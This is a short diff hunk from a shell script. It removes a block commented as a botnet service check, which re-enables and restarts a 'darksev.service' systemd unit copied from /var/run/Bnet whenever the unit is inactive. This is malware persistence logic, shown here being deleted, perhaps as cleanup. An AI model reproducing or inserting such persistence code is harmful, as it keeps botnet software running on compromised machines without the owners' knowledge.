@@ -27,30 +27,6 @@ while ! ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1; do
     
         fi
     
-        sleep 5 
-    
-        # botnet.service check
-        service_name="darksev.service"
-    
-        if ! systemctl is-active --quiet "$service_name"; then
-    
-            systemctl daemon-reload
-            systemctl enable darksev.service
-            systemctl start darksev.service
-    
-        serv_file="/etc/systemd/system/darksev.service"
-        elif [[ ! -d "$serv_file" ]]; then
-            
-            systemctl daemon-reload
-            cp /var/run/Bnet/darksev.service /etc/systemd/system/
-            systemctl enable darksev.service
-            systemctl start darksev.service 
-            systemctl daemon-reload
-    
-    
-        fi
-    
-        sleep 5  
     done
     
 done
